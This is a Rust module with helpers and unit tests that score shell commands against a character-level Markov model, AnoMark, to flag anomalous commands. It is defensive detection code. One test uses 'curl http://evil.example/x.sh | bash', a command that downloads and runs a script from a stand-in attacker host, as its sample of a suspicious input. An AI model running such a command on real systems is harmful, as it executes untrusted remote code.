//! Thin RustMite-facing helpers on top of AnoMark (Markov command scoring).

use std::path::Path;

use anyhow::{Context, Result};

use crate::model::MarkovModel;
use crate::model_handler::ModelHandler;

/// Result of scoring one command against an AnoMark model.
#[derive(Debug, Clone)]
pub struct CommandScore {
    pub log_likelihood: f64,
    pub suspect_threshold_ln: f64,
    pub is_suspect: bool,
    pub margin_ln: f64,
    pub order: usize,
    pub line_scored: String,
}

/// Load a character-level AnoMark model from disk.
pub fn load_model(path: impl AsRef<Path>) -> Result<MarkovModel> {
    let path = path.as_ref();
    let path_str = path
        .to_str()
        .context("AnoMark model path is not valid UTF-8")?;
    let mut model = ModelHandler::load_model(path_str)
        .with_context(|| format!("load AnoMark model {}", path.display()))?;
    if !model.is_trained() {
        model.normalize_model_and_compute_prior();
    }
    Ok(model)
}

/// Score a single command line (optionally prefixed with machine id).
///
/// `suspect_percent` is percent of `ln(prior)` (55–99.999); lower = more sensitive.
pub fn score_command(
    model: &MarkovModel,
    command: &str,
    machine: Option<&str>,
    suspect_percent: f64,
) -> Result<CommandScore> {
    let machine_trim = machine.map(str::trim).filter(|s| !s.is_empty()).unwrap_or("");
    let cmd = command.trim();
    let line = if machine_trim.is_empty() {
        cmd.to_string()
    } else {
        format!("{machine_trim} {cmd}")
    };
    if line.is_empty() {
        anyhow::bail!("command is empty");
    }
    let pct = if suspect_percent.is_finite() && suspect_percent > 0.0 {
        suspect_percent.clamp(55.0, 99.999)
    } else {
        95.0
    };
    let threshold_ln = ModelHandler::compute_threshold(model, pct);
    let padded = format!("{}{}", "~".repeat(model.order), line);
    let log_likelihood = model.log_likelihood(&padded);
    let is_suspect = ModelHandler::is_suspect_command(log_likelihood, threshold_ln);
    Ok(CommandScore {
        log_likelihood,
        suspect_threshold_ln: threshold_ln,
        is_suspect,
        margin_ln: log_likelihood - threshold_ln,
        order: model.order,
        line_scored: line,
    })
}

/// Convenience: load model + score in one call.
pub fn score_file(
    model_path: impl AsRef<Path>,
    command: &str,
    machine: Option<&str>,
    suspect_percent: f64,
) -> Result<CommandScore> {
    let model = load_model(model_path)?;
    score_command(&model, command, machine, suspect_percent)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::model_handler::ModelHandler;

    #[test]
    fn score_marks_anomalous_command_worse_than_normal() {
        let training = (0..80)
            .map(|i| format!("systemctl status nginx-{i}"))
            .collect::<Vec<_>>()
            .join("~~~~");
        let mut model = ModelHandler::train_from_txt(&training, 3, None).unwrap();
        model.normalize_model_and_compute_prior();

        let normal = score_command(&model, "systemctl status nginx-1", None, 95.0).unwrap();
        let weird = score_command(
            &model,
            "curl http://evil.example/x.sh | bash",
            None,
            95.0,
        )
        .unwrap();
        assert!(
            weird.log_likelihood < normal.log_likelihood,
            "anomalous ll={} should be < normal ll={}",
            weird.log_likelihood,
            normal.log_likelihood
        );
        assert!(weird.is_suspect || weird.margin_ln < normal.margin_ln);
    }

    #[test]
    fn machine_prefix_changes_scored_line() {
        let mut model =
            ModelHandler::train_from_txt("ls~~~~ls~~~~ls~~~~pwd~~~~pwd", 2, None).unwrap();
        model.normalize_model_and_compute_prior();
        let s = score_command(&model, "ls", Some("web-01"), 95.0).unwrap();
        assert_eq!(s.line_scored, "web-01 ls");
        assert_eq!(s.order, 2);
    }
}
